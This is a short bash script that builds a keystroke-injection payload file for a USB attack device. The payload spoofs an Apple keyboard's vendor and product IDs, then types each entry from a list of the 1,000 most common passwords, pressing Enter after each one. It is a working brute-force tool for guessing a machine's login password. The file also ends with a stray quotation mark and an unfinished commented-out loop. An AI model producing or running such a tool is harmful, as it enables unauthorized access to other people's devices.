#!/bin/bash
filename=1000-most-common-passwords.txt 
declare -a myArray
myArray=(`cat "$filename"`)
echo "LANGUAGE='us'" > payload.txt
echo "LED G" >> payload.txt
echo "ATTACKMODE HID VID_0X05AC PID_0X021E" >> payload.txt
echo "LED G B R" >> payload.txt
echo "QUACK ENTER" >> payload.txt
for (( i = 0 ; i < ${#myArray[@]} ; i++))
do
echo $i
#echo "QUACK GUI SPACE" >> payload.txt
echo "QUACK STRING ${myArray[$i]}" >> payload.txt
echo "QUACK DELAY 50" >> payload.txt 
echo "QUACK ENTER" >> payload.txt
echo "QUACK DELAY 100" >> payload.txt 
echo "LED B" >> payload.txt
done
echo "LED G" >> payload.txt
"
#for ((i=0; i))
